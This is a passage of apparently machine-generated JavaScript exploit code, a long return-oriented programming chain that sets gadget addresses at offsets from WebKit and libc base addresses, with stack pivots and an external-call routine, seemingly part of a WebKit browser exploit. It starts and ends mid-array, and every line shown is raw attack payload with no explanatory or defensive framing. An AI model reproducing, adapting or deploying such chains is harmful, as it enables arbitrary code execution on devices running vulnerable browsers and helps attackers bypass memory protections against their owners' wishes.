webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+84456, //L473
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+84408, //L470
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+84440, //L472
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L470:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L471:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L472:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L473:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+84576, //L475
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+84592, //L476
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+84560, //L474
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L474:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L475:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L476:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+84680, //L478
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L478:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+84736, //L479
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L479:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+84808, //L482
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L482:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+84864, //L484
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L484:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+865136, //mov [rax], cl
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
//L485:
libc_base+793877, //pop rsi
ropchain+84968, //L487
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L486:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+792472,); //pop rcx
//L487:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+85056, //L489
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+85072, //L490
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L489:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L490:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+85224, //L493
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+85256, //L495
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+85208, //L492
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+85240, //L494
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L492:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L493:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L494:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L495:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+85352, //L497
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+85336, //L496
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L496:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L497:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+85440, //L499
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L498:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L499:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+85512, //L501
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L500:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+792472,); //pop rcx
//L501:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+793877, //pop rsi
ropchain+85576, //L504
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L504:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+811575, //pop rsp
ropchain+73968, //L202
//L235:
libc_base+793877, //pop rsi
ropchain+85688, //L506
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L505:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L506:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+85776, //L508
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+85792, //L509
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L508:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L509:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+85912, //L512
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+85928, //L513
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+85896, //L511
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L511:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L512:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L513:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+86024, //L514
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+86040, //L515
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L514:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L515:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+86152, //L516
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+86136, //L517
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L517:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L516:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+86240, //L519
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+86224, //L518
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L518:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L519:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+86336, //L520
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+86352, //L521
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L520:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L521:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+86464, //L522
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+86448, //L523
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L523:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L522:
db([0, 0]); // 0x0
//_create_extcall:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+86536, //L524
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L524:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+86600, //L526
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L526:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L529:
db([32, 0]); // 0x20
set_gadget(libc_base+792472,); //pop rcx
//L530:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+86752, //L531
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+86768, //L532
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L531:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L532:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+86856, //L534
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+86888, //L536
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L534:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L535:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+206806,); //pop rdi
//L536:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L538:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+87016, //L540
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+87032, //L541
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L540:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L541:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+87176, //L545
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+87144, //L543
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+87160, //L544
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L543:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L544:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L545:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+87248, //L547
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L547:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+87304, //L548
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L548:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+87384, //L550
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L550:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L551:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L552:
db([1, 0]); // 0x1
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+87488, //L553
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+87504, //L554
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L553:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L554:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+87592, //L556
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L556:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+87648, //L557
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L557:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+87768, //L560
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L559:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L560:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+87856, //L562
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+87872, //L563
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L562:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L563:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+88016, //L567
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+87984, //L565
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+88000, //L566
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L565:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L566:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L567:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+88088, //L569
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L569:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+88144, //L570
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L570:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+88224, //L572
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L572:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L573:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L574:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+88328, //L575
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+88344, //L576
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L575:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L576:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+88432, //L578
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L578:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+88488, //L579
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L579:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+88560, //L582
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L582:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+88616, //L584
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L584:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L585:
pivot_addr,
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+88768, //L587
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L586:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L587:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+88856, //L589
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+88872, //L590
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L589:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L590:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+89016, //L594
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+88984, //L592
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+89000, //L593
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L592:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L593:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L594:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+89088, //L596
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L596:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+89144, //L597
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L597:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+89224, //L599
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L599:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L600:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L601:
db([1, 0]); // 0x1
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+89328, //L602
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+89344, //L603
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L602:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L603:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+89432, //L605
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L605:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+89488, //L606
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L606:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+89560, //L609
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L609:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+89616, //L611
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L611:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+89720, //L613
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L612:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L613:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+89808, //L615
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+89824, //L616
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L615:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L616:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+89968, //L620
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+89936, //L618
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+89952, //L619
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L618:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L619:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L620:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+90040, //L622
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L622:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+90096, //L623
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L623:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+90176, //L625
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L625:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L626:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L627:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+90280, //L628
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+90296, //L629
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L628:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L629:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+90384, //L631
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L631:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+90440, //L632
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L632:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+90560, //L635
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
